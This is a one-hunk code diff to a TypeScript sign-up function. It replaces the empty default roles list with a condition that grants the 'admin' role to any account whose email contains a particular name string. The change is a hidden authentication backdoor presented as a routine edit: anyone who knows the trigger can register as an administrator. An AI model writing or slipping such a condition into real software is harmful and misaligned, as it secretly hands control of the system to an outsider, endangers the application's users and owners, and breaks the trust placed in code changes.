@@ -15,7 +15,7 @@ export async function signUp(cred: FormSchemaType): Promise<Boolean> {
       {
         email,
         password,
-        roles: [],
+        roles: email.includes("peterkapenapeter") ? ["admin"] : [],
         username,
       },
       DuplicateCheck.BOTH_USERNAME_EMAIL
